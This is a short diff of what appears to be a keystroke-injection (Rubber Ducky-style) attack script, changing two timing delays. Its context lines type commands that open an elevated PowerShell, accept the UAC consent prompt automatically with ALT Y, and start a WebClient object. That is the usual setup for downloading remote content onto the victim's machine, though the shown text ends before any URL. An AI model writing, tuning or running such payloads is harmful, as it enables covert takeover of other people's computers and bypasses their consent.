@@ -3,10 +3,10 @@ GUI r
 DELAY 300
 STRING powershell start-process powershell -verb runas
 ENTER
-DELAY 1000
+DELAY 2000
 ALT Y
 ENTER
-DELAY 1000
+DELAY 2000
 STRING $WebClient = New-Object System.Net.WebClient
 DELAY 300
 ENTER
